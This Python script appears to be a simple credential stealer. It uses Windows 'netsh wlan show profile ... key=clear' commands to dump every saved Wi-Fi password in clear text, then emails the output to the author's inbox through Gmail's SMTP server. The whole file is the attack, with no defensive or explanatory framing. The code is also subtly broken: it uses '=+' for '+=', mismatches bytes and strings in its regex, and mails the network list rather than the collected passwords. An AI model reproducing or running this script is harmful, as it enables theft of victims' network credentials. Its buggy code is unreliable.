#!/usr/bin/env python

import smtplib
import subprocess
import re

"""To send mails using your gmail account, you should create an app password from Gmail settings. """

def send_mail(email, password, message):
    """This function allows you to send mails from a gmail account"""

    server = smtplib.SMTP("smtp.gmail.com", 587,)
    server.starttls()
    server.login(email, password)

    # (From_email, To_email, content of the mail)
    server.sendmail(email, email, message)
    server.quit()


# This will list all connected networks
command_to_execute = "netsh wlan show profile"
networks = subprocess.check_output(command_to_execute, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks) #Noncapturing groups | findall gives us a list of the finding

result = ""
for network in networks_names_list:
    command_to_execute = f"netsh wlan show profile {network} key=clear"
    current_result =+ subprocess.check_output(command_to_execute, shell=True)
    result =+ current_result
    
    
send_mail("mail", "password", networks)
